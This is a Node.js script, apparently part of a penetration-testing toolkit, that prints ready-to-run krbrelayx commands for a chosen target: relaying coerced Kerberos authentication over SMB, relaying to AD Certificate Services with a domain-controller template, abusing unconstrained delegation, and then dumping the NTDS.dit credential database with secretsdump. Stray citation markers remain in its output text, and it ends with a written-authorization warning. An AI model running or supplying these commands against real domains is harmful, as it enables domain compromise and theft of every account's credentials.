#!/usr/bin/env node
/**
 * MFH TOOLS - KrbRelayX
 * Categoria: Kerberoasting
 *
 * Uso: node krbrelayx.js --target <smb://host:445> [--ip <local_ip>] [--loot <dir>] [--format ccache|kirbi]
 *
 * Autor: FalconMX Security
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

// ============================================================
// REPORTE
// ============================================================
function printReport(target, ip, loot, format) {
    console.log('');
    console.log('='.repeat(65));
    console.log('  KRBRELAYX');
    console.log('  Target: ' + (target || 'smb://server:445'));
    console.log('  Interface IP: ' + (ip || '192.168.1.50'));
    console.log('  Loot: ' + (loot || './loot'));
    console.log('  Formato: ' + (format || 'ccache'));
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('='.repeat(65));
    console.log('');
    console.log('  [Tool] krbrelayx');
    console.log('    krbrelayx is a tool for relaying Kerberos authentication over SMB/HTTP, allowing attackers to coerce authentication and relay it to other services [citation:7][citation:14]');
    console.log('');
    console.log('  [Install]');
    console.log('    git clone https://github.com/dirkjanm/krbrelayx');
    console.log('    cd krbrelayx && pip install -r requirements.txt');
    console.log('');
    console.log('  [Comando] Kerberos relay (sin credenciales)');
    console.log('    krbrelayx.py -t ' + (target || 'smb://server:445') + ' -ip ' + (ip || '192.168.1.50') + ' -l ' + (loot || './loot'));
    console.log('');
    console.log('  [Comando] Kerberos relay sobre SMB con ADCS');
    console.log('    krbrelayx.py -t ' + (target || 'smb://server:445') + ' --adcs --template DomainController -v DC03$');
    console.log('');
    console.log('  [Comando] Unconstrained delegation abuse');
    console.log('    krbrelayx.py -t ' + (target || 'smb://server:445') + ' -l ' + (loot || './loot') + ' -f ' + (format || 'ccache'));
    console.log('');
    console.log('  [Comando] Con credenciales de unconstrained delegation user');
    console.log('    krbrelayx.py -s DOMAIN.LOCALunconstraineduser -p "password" -t ' + (target || 'DC.domain.com'));
    console.log('');
    console.log('  [Opciones comunes]');
    console.log('    -t target       Target (HOSTNAME, no IP) [citation:7]');
    console.log('    -ip interface   IP local para servidores SMB/HTTP');
    console.log('    -l lootdir      Directorio para guardar tickets');
    console.log('    -f format       ccache (Impacket) o kirbi (Mimikatz)');
    console.log('    -wh WPAD_HOST   Host WPAD para proxy auth');
    console.log('    --adcs          Relay a ADCS (Certificate Services)');
    console.log('    --template      Template ADCS (DomainController, WebServer)');
    console.log('');
    console.log('  [Notas]');
    console.log('    - -t SOLO acepta HOSTNAMES (no IPs) para Kerberos [citation:7]');
    console.log('    - Requiere coercion de autenticacion (PetitPotam, Coercer, PrinterBug)');
    console.log('    - Se necesita un DNS record apuntando a la maquina atacante');
    console.log('    - Al obtener el ticket, exportar: export KRB5CCNAME=DC.ccache [citation:14]');
    console.log('    - Luego usar secretsdump.py -k para dump de NTDS.dit [citation:14]');
    console.log('');
    console.log('-'.repeat(65));
    console.log('  WARN: solo ataca dominios con autorizacion escrita');
    console.log('-'.repeat(65));
    console.log('');
}

// ============================================================
// CLI
// ============================================================
function main() {
    var args = process.argv.slice(2);
    var targetIdx = args.indexOf('--target');
    var ipIdx = args.indexOf('--ip');
    var lootIdx = args.indexOf('--loot');
    var formatIdx = args.indexOf('--format');

    if (args.length === 0) {
        console.log('');
        console.log('+------------------------------------------------------+');
        console.log('|  MFH TOOLS - KrbRelayX v' + CONFIG.version + '                      |');
        console.log('|  ' + CONFIG.author + '                              |');
        console.log('+------------------------------------------------------+');
        console.log('');
        console.log('  Uso: node krbrelayx.js --target <smb://host:445> [--ip <local_ip>] [--loot <dir>] [--format ccache|kirbi]');
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node krbrelayx.js --target smb://DC01.domain.local:445 --ip 192.168.1.50 --loot ./loot');
        console.log('    node krbrelayx.js --target DC.domain.com --format kirbi');
        console.log('');
        process.exit(0);
    }

    var target = targetIdx !== -1 ? args[targetIdx + 1] : 'smb://server:445';
    var ip = ipIdx !== -1 ? args[ipIdx + 1] : '192.168.1.50';
    var loot = lootIdx !== -1 ? args[lootIdx + 1] : './loot';
    var format = formatIdx !== -1 ? args[formatIdx + 1] : 'ccache';

    console.log('\nGenerando comandos KrbRelayX...\n');
    printReport(target, ip, loot, format);
}

main();
